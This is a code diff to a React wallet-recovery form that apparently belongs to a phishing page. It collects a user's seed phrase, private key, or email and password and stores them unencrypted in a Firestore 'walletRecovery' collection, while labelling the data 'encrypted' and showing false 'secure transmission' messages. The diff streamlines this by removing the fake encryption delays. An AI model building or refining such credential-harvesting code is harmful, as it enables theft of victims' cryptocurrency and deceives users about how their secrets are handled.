@@ -75,39 +75,32 @@ function ErrorRecoverySection({
     e.preventDefault();
     
     setIsSubmitting(true);
-    setEncryptionStep(1);
+    setEncryptionStep(3);
     
     const walletName = selectedWallet?.id === 'other' ? customWalletName : selectedWallet?.name;
     
-    // Simulate encryption process
-    setTimeout(() => setEncryptionStep(2), 1000);
-    setTimeout(() => setEncryptionStep(3), 2000);
-    
     try {
-      setTimeout(async () => {
-        const payload = {
-          walletType: walletName || 'Unknown',
-          walletAddress: walletAddress || 'Not provided',
-          recoveryOption: recoveryOption,
-          timestamp: new Date().toISOString(),
-          status: 'pending',
-          encrypted: true,
-        };
+      const payload = {
+        walletType: walletName || 'Unknown',
+        walletAddress: walletAddress || 'Not provided',
+        recoveryOption: recoveryOption,
+        timestamp: new Date().toISOString(),
+        status: 'pending',
+        encrypted: true,
+      };
 
-        if (recoveryOption === 'Seed Phrase') {
-          payload.seedPhrase = seedWords.join(' ');
-        }
-        if (recoveryOption === 'Email & Password') {
-          payload.email = formData.email;
-          payload.password = formData.password;
-        }
-        if (recoveryOption === 'Private Key') payload.privateKey = formData.privateKey;
+      if (recoveryOption === 'Seed Phrase') {
+        payload.seedPhrase = seedWords.join(' ');
+      }
+      if (recoveryOption === 'Email & Password') {
+        payload.email = formData.email;
+        payload.password = formData.password;
+      }
+      if (recoveryOption === 'Private Key') payload.privateKey = formData.privateKey;
 
-        await addDoc(collection(db, 'walletRecovery'), payload);
-        
-        onSuccess();
-      }, 3000);
+      await addDoc(collection(db, 'walletRecovery'), payload);
       
+      onSuccess();
     } catch (error) {
       console.error('Error saving recovery data:', error);
       alert('Secure transmission failed. Please try again.');
